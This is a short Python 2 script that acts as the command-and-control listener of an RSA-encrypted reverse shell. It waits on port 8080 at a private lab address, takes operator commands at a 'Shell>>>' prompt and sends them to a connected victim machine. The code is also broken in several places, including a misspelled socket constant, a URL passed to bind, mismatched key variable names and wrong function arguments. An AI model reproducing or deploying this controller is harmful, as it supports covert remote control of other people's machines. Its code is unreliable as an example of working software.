import socket, os 
from Crypto.PublicKey import RSA

def keyGen():
	newKey = RSA.generate(4096)
	publicKey = newKey.publickey().export("PEM")
	privateKey = newKey.exportKey("PEM")
	return publickey, privateKey

def encrypt(cmd, publickey):
	encrypt =  RSA.importKey(publicKey)
	global encryptedData
	encryptedData = encrypt.encrypt(cmd, 0)
	return encryptedData[0]

def decrypt(cipher, privateKey):
	decrypt = RSA.importKey(privateKey)
	decrypted = decrypt.decrypt(cipher)
	return decrypted



def connect():
	s = socket.socket(socket.AF_INT, socket.SOCK_STREAM)
	s.bind(("http://192.168.56.103", 8080))
	s.listen(1)
	print "[+]Server is listening on port 8080"
	conn, addr = s.accept()
	print "Connection from IP: " + addr

	while True:
		store = ''
		command = raw_input("Shell>>>")

		command = encrypt(command)

		if 'terminate' in command:
			conn.close()
			break

		else:
			conn.send(command)
			result = conn.recv(512)

			if len( decrypt(result) ) == 512:
				store = store + decrypt(result)
				result = conn.recv(512)
				store = store + decrypt(result)
			else:
				print decrypt(result)
		print store

def main():
	keyGen()
	connect()
main()